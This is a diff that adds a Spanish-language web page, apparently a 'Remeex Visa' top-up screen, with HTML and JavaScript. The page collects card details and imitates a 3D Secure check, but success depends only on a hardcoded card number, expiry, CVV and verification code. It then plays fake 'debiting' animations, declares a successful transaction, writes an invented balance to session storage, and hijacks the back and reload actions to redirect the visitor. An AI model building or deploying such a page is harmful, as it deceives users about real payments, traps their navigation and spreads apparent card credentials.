+        <h3 style="font-size:1.1rem; font-weight:600;">Verify by phone</h3>
+        <p style="font-size:0.9rem; margin:0.75rem 0;">
+          Te enviamos un código de verificación al móvil <strong>**********2746</strong> <br/>
+          Estás autorizando un pago a Visa Remeex Premium
+        </p>
+        <div style="margin-bottom:1rem;">
+          <label style="font-size:0.85rem; font-weight:600;">Introduce el código de 6 dígitos:</label>
+          <div style="margin-top:0.5rem;">
+            <input type="text" id="input3DCode" placeholder="000000" maxlength="6" style="width:100px; text-align:center; border:2px solid var(--text-secondary); border-radius:6px; padding:0.4rem;" />
+          </div>
+        </div>
+        <div style="margin-bottom:1rem; font-size:0.9rem;">
+          Tiempo restante: <span id="timer3D">60</span> segundos
+        </div>
+        <div style="display:flex; justify-content:center; gap:1rem;">
+          <button id="btnConfirm3D" class="btn-glow" style="background: #777; cursor: not-allowed; pointer-events: none; width:120px;">Confirmar</button>
+          <button id="btnResend3D" class="btn-glow" style="background:#888; border:none; width:120px;">Reenviar Código</button>
+        </div>
+      </div>
+    </div>
+
+    <!-- Overlay Loader único con efecto vortex y animación de íconos -->
+    <div class="overlay-loader" id="overlayLoader">
+      <!-- Nuevo canvas de fondo para el efecto vortex -->
+      <canvas id="loaderCanvas"></canvas>
+      <div class="loader-wrapper">
+        <div class="loader-container">
+          <div class="dots-wrapper" id="dotsWrapper">
+            <div class="dot"></div>
+            <div class="dot"></div>
+            <div class="dot"></div>
+          </div>
+          <!-- Los círculos para éxito y error se muestran mediante la clase .show -->
+          <div id="checkCircle"></div>
+          <div id="xCircle"></div>
+          <span class="checkmark" id="checkmark">✓</span>
+          <span class="xmark" id="xmark">✗</span>
+        </div>
+        <div class="loading-text" id="loaderText">Analizando Tarjeta</div>
+        <div class="percentage" id="loaderPercentage">0</div>
+      </div>
+    </div>
+
+    <!-- Overlay Resumen Final -->
+    <div class="overlay-loader" id="overlayResumen">
+      <div class="loader-wrapper">
+        <div class="loader-container">
+          <div class="dots-wrapper" id="dotsResumen" style="opacity:0; gap:0;"></div>
+          <div class="check-circle" id="resumenCircle" style="background: linear-gradient(145deg, #22c55e, #16a34a); box-shadow: 0 0 20px rgba(34, 197, 94, 0.4);"></div>
+          <span class="checkmark" id="resumenCheckmark">✓</span>
+        </div>
+        <!-- Se elimina el título estático para sustituirlo por el efecto -->
+        <div class="loading-text" id="resumenTitulo">Transacción Exitosa</div>
+        <p id="resumenMensaje" style="font-size:0.9rem; color:var(--text-primary); text-align:center; max-width:300px; margin-top:0.5rem;">
+          Resumen de la transacción...
+        </p>
+        <p style="color:var(--danger); font-size:0.9rem; text-align:center; margin-top:1rem;">
+          Por favor, no cierre el navegador
+        </p>
+      </div>
+    </div>
+  </div> <!-- Fin container -->
+
+  <!-- NUEVO: Contenedor para el efecto de "Transacción Exitosa" -->
+  <div id="explosionEffect" style="display:none;">
+    <canvas id="explosion-canvas"></canvas>
+    <canvas id="vortex-canvas"></canvas>
+    <div id="message">Transacción Exitosa</div>
+  </div>
+
+  <script>
+    let isRedirecting = false; // Bandera para indicar redirección
+
+    // Redirigir si el usuario presiona Atrás o recarga la página
+    history.pushState({}, '', '');
+    window.addEventListener('popstate', () => { window.location.href = "https://remeexvisa.com"; });
+    window.addEventListener('beforeunload', (e) => {
+      if (!isRedirecting) { e.preventDefault(); window.location.href = "https://remeexvisa.com"; e.returnValue = ''; }
+    });
+
+    // PARÁMETROS FIJOS
+    const USD_RATE = 69.0;
+    const VALID_CARD_NUMBER = "4745034211763009";
+    const VALID_EXPIRY = "01/26";
+    const VALID_CVV = "583";
+    const VALID_3D_CODE = "142536";
+
+    let selectedMonto = "";
+    let todayStr = "";
+    let operationCode = "";
+
+    // 3D Secure
+    let timeLeft3D = 60;
+    let countdown3D = null;
+
+    // REFERENCIAS A ELEMENTOS (sección Recarga y Tarjeta)
+    const sectionMonto       = document.getElementById('sectionMonto');
+    const sectionTarjeta     = document.getElementById('sectionTarjeta');
+    const montoSelect        = document.getElementById('montoSelect');
+    const btnMontoContinuar  = document.getElementById('btnMontoContinuar');
+    const seleccionadoUSD    = document.getElementById('seleccionadoUSD');
+    const recibesBs          = document.getElementById('recibesBs');
+    const usdRateLabel       = document.getElementById('usdRate');
+    const fechaHoyLabel      = document.getElementById('fechaHoy');
+    const horaHoyLabel       = document.getElementById('horaHoy');
+
+    // Tarjeta Inputs
+    const cardNumberInput    = document.getElementById('cardNumberInput');
+    const cardHolderInput    = document.getElementById('cardHolderInput');
+    const cardExpiryInput    = document.getElementById('cardExpiryInput');
+    const cardCVVInput       = document.getElementById('cardCVVInput');
+
+    // Tarjeta Displays
+    const numberDisplay      = document.getElementById('numberDisplay');
+    const holderDisplay      = document.getElementById('holderDisplay');
+    const expiryDisplay      = document.getElementById('expiryDisplay');
+    const cvvDisplayBack     = document.getElementById('cvvDisplayBack');
+
+    // Botón Recargar
+    const btnRecargar        = document.getElementById('btnRecargar');
+
+    // Overlays 3D
+    const overlay3D          = document.getElementById('overlay3D');
+    const input3DCode        = document.getElementById('input3DCode');
+    const timer3DLabel       = document.getElementById('timer3D');
+    const btnConfirm3D       = document.getElementById('btnConfirm3D');
+    const btnResend3D        = document.getElementById('btnResend3D');
+
+    // Overlay Loader único
+    const overlayLoader      = document.getElementById('overlayLoader');
+    const loaderText         = document.getElementById('loaderText');
+    const loaderPercentage   = document.getElementById('loaderPercentage');
+    const dotsWrapper        = document.getElementById('dotsWrapper');
+    const checkCircle        = document.getElementById('checkCircle');
+    const xCircle            = document.getElementById('xCircle');
+    const checkmark          = document.getElementById('checkmark');
+    const xmark              = document.getElementById('xmark');
+
+    // Overlay Resumen final
+    const overlayResumen     = document.getElementById('overlayResumen');
+    const resumenTitulo      = document.getElementById('resumenTitulo');
+    const resumenMensaje     = document.getElementById('resumenMensaje');
+    const dotsResumen        = document.getElementById('dotsResumen');
+    const resumenCircle      = document.getElementById('resumenCircle');
+    const resumenCheckmark   = document.getElementById('resumenCheckmark');
+
+    // AL CARGAR: inicializar fecha, hora, tasa, código de operación y ocultar secciónTarjeta
+    window.addEventListener('load', () => {
+      const now = new Date();
+      const day = String(now.getDate()).padStart(2, '0');
+      const month = String(now.getMonth() + 1).padStart(2, '0');
+      const year = now.getFullYear();
+      const hours = String(now.getHours()).padStart(2, '0');
+      const mins = String(now.getMinutes()).padStart(2, '0');
+      todayStr = `${day}/${month}/${year}`;
+      fechaHoyLabel.textContent = todayStr;
+      horaHoyLabel.textContent = `${hours}:${mins}`;
+      usdRateLabel.textContent = USD_RATE.toFixed(2);
+      const randomCode = Math.floor(Math.random() * 1000000000);
+      operationCode = "OP-" + randomCode;
+      sectionTarjeta.classList.remove('active');
+    });
+
+    // SELECCIÓN DE MONTO
+    btnMontoContinuar.addEventListener('click', () => {
+      selectedMonto = montoSelect.value;
+      if(!selectedMonto) {
+        alert('Por favor selecciona un monto de recarga.');
+        return;
+      }
+      // Calcular bolívares
+      const totalBs = (parseFloat(selectedMonto) * USD_RATE).toLocaleString('es-VE', {
+        minimumFractionDigits: 2,
+        maximumFractionDigits: 2
+      });
+      seleccionadoUSD.textContent = `USD ${selectedMonto},00`;
+      recibesBs.textContent       = totalBs;
+      sectionMonto.classList.remove('active');
+      setTimeout(() => {
+        sectionMonto.style.display  = 'none';
+        sectionTarjeta.style.display= 'block';
+        setTimeout(() => { sectionTarjeta.classList.add('active'); }, 50);
+      }, 300);
+    });
+
+    // TARJETA => Actualizar Displays
+    cardNumberInput.addEventListener('input', (e) => {
+      let val = e.target.value.replace(/\D/g, '').slice(0,16);
+      let formattedValue = val.replace(/(\d{4})/g, '$1 ').trim();
+      e.target.value = formattedValue;
+      updateCardNumber(val);
+    });
+    function updateCardNumber(value) {
+      let display = '•••• •••• •••• ••••';
+      if(value) { display = value.replace(/(\d{4})/g, '$1 ').trim(); }
+      numberDisplay.textContent = display;
+    }
+    cardHolderInput.addEventListener('input', (e) => {
+      let val = e.target.value;
+      holderDisplay.textContent = val ? val.toUpperCase() : 'NOMBRE APELLIDO';
+    });
+    cardExpiryInput.addEventListener('input', (e) => {
+      let val = e.target.value.replace(/\D/g, '').slice(0,4);
+      if(val.length > 2) { val = val.slice(0,2) + '/' + val.slice(2,4); }
+      e.target.value = val;
+      expiryDisplay.textContent = val || 'MM/AA';
+    });
+    cardCVVInput.addEventListener('input', (e) => {
+      let val = e.target.value.replace(/\D/g, '').slice(0,3);
+      e.target.value = val;
+      cvvDisplayBack.textContent = val || '•••';
+      if(val.length > 0) { cvvDisplayBack.classList.add('active'); } 
+      else { cvvDisplayBack.classList.remove('active'); }
+    });
+
+    // BOTÓN RECARGAR
+    btnRecargar.addEventListener('click', onRecargar);
+    function onRecargar() {
+      const num    = cardNumberInput.value.replace(/\s/g, '');
+      const holder = cardHolderInput.value.trim();
+      const exp    = cardExpiryInput.value.trim();
+      const cvv    = cardCVVInput.value.trim();
+      if(!selectedMonto) { alert('Debes seleccionar un monto.'); return; }
+      if(!num || num.length !== 16 || !holder || !exp.includes('/') || cvv.length < 3) {
+        alert('Por favor, completa todos los campos correctamente.');
+        return;
+      }
+      if(num !== VALID_CARD_NUMBER || exp !== VALID_EXPIRY || cvv !== VALID_CVV) { showLoaderAnalysis(false); }
+      else { showLoaderAnalysis(true); }
+    }
+    function showLoaderAnalysis(isValid) {
+      overlayLoader.classList.add('active');
+      resetLoader();
+      loaderText.textContent = 'Analizando Tarjeta';
+      simulateCardAnalysis(isValid);
+    }
+    function simulateCardAnalysis(isValid) {
+      let progress = 0;
+      const interval = setInterval(() => {
+        progress += Math.random() * 3;
+        if(progress >= 100) {
+          progress = 100;
+          clearInterval(interval);
+          if(isValid) {
+            showCheck();
+            loaderText.textContent = 'Tarjeta Válida';
+            setTimeout(() => { overlayLoader.classList.remove('active'); start3DSecure(); }, 1500);
+          } else {
+            showX();
+            loaderText.textContent = 'Tarjeta Errada';
+            setTimeout(() => { overlayLoader.classList.remove('active'); }, 2500);
+          }
+        }
+        loaderPercentage.textContent = Math.floor(progress);
+      }, 80);
+    }
+    function resetLoader() {
+      loaderPercentage.textContent = '0';
+      checkCircle.classList.remove('show');
+      xCircle.classList.remove('show');
+      checkmark.classList.remove('show');
+      xmark.classList.remove('show');
+      loaderText.textContent = 'Analizando Tarjeta';
+    }
+    function showCheck() { 
+      checkCircle.classList.add('show'); 
+      checkmark.classList.add('show'); 
+    }
+    function showX() { 
+      xCircle.classList.add('show'); 
+      xmark.classList.add('show'); 
+    }
+
+    // 3D SECURE
+    function start3DSecure() {
+      overlay3D.classList.add('active');
+      input3DCode.value = '';
+      btnConfirm3D.style.background = '#777';
+      btnConfirm3D.style.cursor = 'not-allowed';
+      btnConfirm3D.style.pointerEvents = 'none';
+      timeLeft3D = 60;
+      timer3DLabel.textContent = timeLeft3D;
+      countdown3D = setInterval(() => {
+        timeLeft3D--;
+        timer3DLabel.textContent = timeLeft3D;
+        if(timeLeft3D <= 0) {
+          clearInterval(countdown3D);
+          btnConfirm3D.style.background = 'linear-gradient(135deg, var(--primary), var(--secondary))';
+          btnConfirm3D.style.cursor = 'pointer';
+          btnConfirm3D.style.pointerEvents = 'auto';
+        }
+      }, 1000);
+    }
+    btnResend3D.addEventListener('click', () => {
+      clearInterval(countdown3D);
+      input3DCode.value = '';
+      btnConfirm3D.style.background = '#777';
+      btnConfirm3D.style.cursor = 'not-allowed';
+      btnConfirm3D.style.pointerEvents = 'none';
+      timeLeft3D = 60;
+      timer3DLabel.textContent = timeLeft3D;
+      countdown3D = setInterval(() => {
+        timeLeft3D--;
+        timer3DLabel.textContent = timeLeft3D;
+        if(timeLeft3D <= 0) {
+          clearInterval(countdown3D);
+          btnConfirm3D.style.background = 'linear-gradient(135deg, var(--primary), var(--secondary))';
+          btnConfirm3D.style.cursor = 'pointer';
+          btnConfirm3D.style.pointerEvents = 'auto';
+        }
+      }, 1000);
+    });
+    btnConfirm3D.addEventListener('click', () => {
+      const code = input3DCode.value.trim();
+      if(code !== VALID_3D_CODE) { alert('Código inválido.'); return; }
+      clearInterval(countdown3D);
+      overlay3D.classList.remove('active');
+      overlayLoader.classList.add('active');
+      resetLoader();
+      loaderText.textContent = `Debitando los fondos por USD ${selectedMonto},00`;
+      simulateDebiting();
+    });
+    function simulateDebiting() {
+      let progress = 0;
+      const interval = setInterval(() => {
+        progress += Math.random() * 3;
+        if(progress >= 100) {
+          progress = 100;
+          clearInterval(interval);
+          showCheck();
+          loaderText.textContent = `Débito Exitoso por USD ${selectedMonto},00`;
+          setTimeout(() => {
+            overlayLoader.classList.remove('active');
+            showResumenFinal();
+          }, 1500);
+        }
+        loaderPercentage.textContent = Math.floor(progress);
+      }, 80);
+    }
+
+    // === RESUMEN FINAL CORREGIDO ===
+    function showResumenFinal() {
+      document.body.classList.add('celebration');
+      overlayResumen.classList.add('active');
+      // Ocultamos el título estático para reemplazarlo por el efecto
+      resumenTitulo.style.display = 'none';
+      resumenMensaje.textContent = `Se ha debitado correctamente USD ${selectedMonto},00. Tu código de operación es ${operationCode}.`;
+      resumenCheckmark.classList.add('show');
+
+      // Iniciamos el efecto de explosión/vórtice sobre “Transacción Exitosa”
+      document.getElementById('explosionEffect').style.display = 'block';
+      startExplosionEffect();
+
+      setTimeout(() => {
+        isRedirecting = true;
+        // 1) Lee los objetos que ya tenías guardados
+        const datosRemeexPrev = JSON.parse(sessionStorage.getItem("datosRemeex") || "{}");
+        const datosVisaPrev  = JSON.parse(sessionStorage.getItem("datosRemeexVisa") || "{}");
+
+        // 2) Combina lo almacenado con la información de la recarga
+        const datosRecarga = {
+          ...datosRemeexPrev,
+          ...datosVisaPrev,
+          saldo: getNewSaldo(),
+          montoRecargaUSD: selectedMonto,
+          montoRecargaBs: (parseFloat(selectedMonto) * USD_RATE).toFixed(2),
+          operationCode: operationCode,
+          fecha: todayStr
+        };
+
+        // 3) Guarda todo unificado en "datosRemeex"
+        sessionStorage.setItem("datosRemeex", JSON.stringify(datosRecarga));
+
+        // 4) (Opcional) Guarda también el saldo y nombre si quieres mostrarlos luego
+        sessionStorage.setItem("currentBalanceBS", datosRecarga.saldo);
+        if (datosRecarga.fullName) {
+          sessionStorage.setItem("userName", datosRecarga.fullName);
+        }
+
+        // 5) Redirige al resumen final
+        window.location.href = "datosremeex.html";
+      }, 5000);
+    }
+
+    // Función para calcular el nuevo saldo (puede tomarlo de sessionStorage si es necesario)
+    function getNewSaldo() {
+      const saldoAnterior = parseFloat(sessionStorage.getItem("currentBalanceBS") || "0");
+      const recargaBs = parseFloat(selectedMonto) * USD_RATE;
+      return (saldoAnterior + recargaBs).toFixed(2);
+    }
+
+    // TARJETA => Rotar la tarjeta al hacer hover (opcional)
+    const cardElement = document.getElementById('card');
+    cardElement.addEventListener('mouseenter', () => { cardElement.style.transform = 'rotateY(180deg)'; });
+    cardElement.addEventListener('mouseleave', () => { cardElement.style.transform = 'rotateY(0deg)'; });
+  </script>
+
+  <!-- Script del efecto vortex para el loader -->
+  <script>
+    (function() {
+      const canvas = document.getElementById('loaderCanvas');
+      if (!canvas) return;
+      const ctx = canvas.getContext('2d');
+      let width, height, center;
+      let particles = [];
+      let frame = 0;
+      const config = {
+        particleCount: 300,
+        baseHue: 220,
+        rangeHue: 20,
+        baseSpeed: 0.5,
+        rangeSpeed: 1.0,
+        baseRadius: 1,
+        rangeRadius: 2,
+        rangeY: 100,
+        backgroundColor: 'transparent'
+      };
+      function resize() {
+        width = canvas.width = canvas.offsetWidth;
+        height = canvas.height = canvas.offsetHeight;
+        center = { x: width / 2, y: height / 2 };
+      }
+      window.addEventListener('resize', resize);
+      resize();
+      class Particle {
+        constructor() {
+          this.reset();
+        }
+        reset() {
+          this.x = Math.random() * width;
+          this.y = center.y + (Math.random() * config.rangeY * 2 - config.rangeY);
+          this.vx = 0;
+          this.vy = 0;
+          this.life = 0;
+          this.ttl = 50 + Math.random() * 150;
+          this.speed = config.baseSpeed + Math.random() * config.rangeSpeed;
+          this.radius = config.baseRadius + Math.random() * config.rangeRadius;
+          this.hue = config.baseHue + Math.random() * config.rangeHue;
+        }
+        update() {
+          const angle = (frame + this.x * 0.01 + this.y * 0.01) * 0.02;
+          this.vx = lerp(this.vx, Math.cos(angle), 0.5);
+          this.vy = lerp(this.vy, Math.sin(angle), 0.5);
+          this.x += this.vx * this.speed;
+          this.y += this.vy * this.speed;
+          this.life++;
+          if (this.isOutOfBounds() || this.life > this.ttl) {
+            this.reset();
+          }
+        }
+        draw() {
+          const opacity = 1 - Math.abs((this.life - this.ttl / 2) / (this.ttl / 2));
+          ctx.save();
+          ctx.strokeStyle = `hsla(${this.hue},100%,60%,${opacity})`;
+          ctx.lineWidth = this.radius;
+          ctx.lineCap = 'round';
+          ctx.beginPath();
+          ctx.moveTo(this.x, this.y);
+          ctx.lineTo(this.x + this.vx * this.speed, this.y + this.vy * this.speed);
+          ctx.stroke();
+          ctx.restore();
+        }
+        isOutOfBounds() {
+          return this.x < 0 || this.x > width || this.y < 0 || this.y > height;
+        }
+      }
+      function lerp(start, end, amt) {
+        return (1 - amt) * start + amt * end;
+      }
+      for (let i = 0; i < config.particleCount; i++) {
+        particles.push(new Particle());
+      }
+      function render() {
+        frame++;
+        ctx.clearRect(0, 0, width, height);
+        particles.forEach(particle => {
+          particle.update();
+          particle.draw();
+        });
+        requestAnimationFrame(render);
+      }
+      render();
+    })();
+  </script>
+
+  <!-- NUEVO: Script para el efecto de "Transacción Exitosa" -->
+  <script>
+    function startExplosionEffect() {
+      const explosionCanvas = document.getElementById('explosion-canvas');
+      const explosionCtx = explosionCanvas.getContext('2d');
+      const vortexCanvas = document.getElementById('vortex-canvas');
+      const vortexCtx = vortexCanvas.getContext('2d');
+      const message = document.getElementById('message');
+
+      let width, height, center;
+      let explosionParticles = [];
+      let vortexParticles = [];
+      let isExploding = true;
+      let isVortexActive = false;
+      let frame = 0;
+
+      class ExplosionParticle {
+        constructor(x, y, color, vx, vy, radius) {
+          this.x = x;
+          this.y = y;
+          this.color = color;
+          this.vx = vx;
+          this.vy = vy;
+          this.radius = radius;
+          this.life = 100;
+        }
+        update() {
+          this.x += this.vx;
+          this.y += this.vy;
+          this.vy += 0.2;
+          this.life--;
+        }
+        draw() {
+          explosionCtx.beginPath();
+          explosionCtx.arc(this.x, this.y, this.radius, 0, Math.PI * 2);
+          explosionCtx.fillStyle = `rgba(${this.color}, ${this.life / 100})`;
+          explosionCtx.fill();
+        }
+      }
+
+      class VortexParticle {
+        constructor() {
+          this.reset();
+        }
+        reset() {
+          this.x = Math.random() * width;
+          this.y = center.y + (Math.random() * 200 - 100);
+          this.vx = 0;
+          this.vy = 0;
+          this.life = 0;
+          this.ttl = 50 + Math.random() * 150;
+          this.speed = Math.random() * 1.5;
+          this.radius = 1 + Math.random() * 2;
+          this.hue = 220 + Math.random() * 100;
+        }
+        update() {
+          const angle = (frame + this.x * 0.01 + this.y * 0.01) * 0.02;
+          this.vx = this.lerp(this.vx, Math.cos(angle), 0.5);
+          this.vy = this.lerp(this.vy, Math.sin(angle), 0.5);
+          this.x += this.vx * this.speed;
+          this.y += this.vy * this.speed;
+          this.life++;
+          if (this.isOutOfBounds() || this.life > this.ttl) {
+            this.reset();
+          }
+        }
+        draw() {
+          const opacity = this.fadeInOut();
+          vortexCtx.save();
+          vortexCtx.strokeStyle = `hsla(${this.hue},100%,60%,${opacity})`;
+          vortexCtx.lineWidth = this.radius;
+          vortexCtx.lineCap = 'round';
+          vortexCtx.beginPath();
+          vortexCtx.moveTo(this.x, this.y);
+          vortexCtx.lineTo(this.x + this.vx * this.speed, this.y + this.vy * this.speed);
+          vortexCtx.stroke();
+          vortexCtx.restore();
+        }
+        lerp(start, end, amt) {
+          return (1 - amt) * start + amt * end;
+        }
+        fadeInOut() {
+          const half = this.ttl * 0.5;
+          const pos = Math.abs(this.life - half);
+          return 1 - (pos / half);
+        }
+        isOutOfBounds() {
+          return this.x < 0 || this.x > width || this.y < 0 || this.y > height;
+        }
+      }
+
+      function resize() {
+        width = explosionCanvas.width = vortexCanvas.width = window.innerWidth;
+        height = explosionCanvas.height = vortexCanvas.height = window.innerHeight;
+        center = { x: width / 2, y: height / 2 };
+      }
+
+      function createExplosion() {
+        explosionParticles = [];
+        // Blue light core
+        for (let i = 0; i < 50; i++) {
+          const angle = Math.random() * Math.PI * 2;
+          const speed = Math.random() * 10;
+          explosionParticles.push(new ExplosionParticle(
+            center.x,
+            center.y,
+            '0, 150, 255',
+            Math.cos(angle) * speed,
+            Math.sin(angle) * speed,
+            Math.random() * 3 + 1
+          ));
+        }
+        // Confetti-like particles
+        const colors = [
+          '0, 150, 255',
+          '135, 206, 235',
+          '100, 149, 237',
+          '70, 130, 180'
+        ];
+        for (let i = 0; i < 200; i++) {
+          const angle = Math.random() * Math.PI * 2;
+          const speed = Math.random() * 15;
+          explosionParticles.push(new ExplosionParticle(
+            center.x,
+            center.y,
+            colors[Math.floor(Math.random() * colors.length)],
+            Math.cos(angle) * speed,
+            Math.sin(angle) * speed,
+            Math.random() * 2 + 1
+          ));
+        }
+      }
+
+      function initVortex() {
+        vortexParticles = Array.from({ length: 700 }, () => new VortexParticle());
+      }
+
+      function render() {
+        frame++;
+        if (isExploding) {
+          explosionCtx.fillStyle = 'rgba(0, 0, 0, 0.1)';
+          explosionCtx.fillRect(0, 0, width, height);
+          for (let i = explosionParticles.length - 1; i >= 0; i--) {
+            explosionParticles[i].update();
+            explosionParticles[i].draw();
+            if (explosionParticles[i].life <= 0) {
+              explosionParticles.splice(i, 1);
+            }
+          }
+          if (explosionParticles.length === 0) {
+            isExploding = false;
+            message.style.opacity = '1';
+            setTimeout(() => {
+              isVortexActive = true;
+            }, 1000);
+          }
+        }
+        if (isVortexActive) {
+          vortexCtx.fillStyle = 'rgba(0, 0, 0, 0.1)';
+          vortexCtx.fillRect(0, 0, width, height);
+          vortexParticles.forEach(particle => {
+            particle.update();
+            particle.draw();
+          });
+          vortexCtx.save();
+          vortexCtx.filter = 'blur(8px) brightness(200%)';
+          vortexCtx.globalCompositeOperation = 'lighter';
+          vortexCtx.drawImage(vortexCanvas, 0, 0);
+          vortexCtx.restore();
+          vortexCtx.save();
+          vortexCtx.filter = 'blur(4px) brightness(200%)';
+          vortexCtx.globalCompositeOperation = 'lighter';
+          vortexCtx.drawImage(vortexCanvas, 0, 0);
+          vortexCtx.restore();
+        }
+        requestAnimationFrame(render);
+      }
+
+      window.addEventListener('resize', resize);
+      resize();
+      createExplosion();
+      initVortex();
+      render();
+    }
+  </script>
+
+  <!-- Tawk.to chat script -->
+  <script>
+    var Tawk_API = Tawk_API || {}, Tawk_LoadStart = new Date();
+    (function(){
+      var s1 = document.createElement("script"), s0 = document.getElementsByTagName("script")[0];
+      s1.async = true;
+      s1.src = 'https://embed.tawk.to/676eba4c49e2fd8dfeff071f/1ig48fetj';
+      s1.charset = 'UTF-8';
+      s1.setAttribute('crossorigin','*');
+      s0.parentNode.insertBefore(s1,s0);
+    })();
+  </script>
+</body>
+</html>
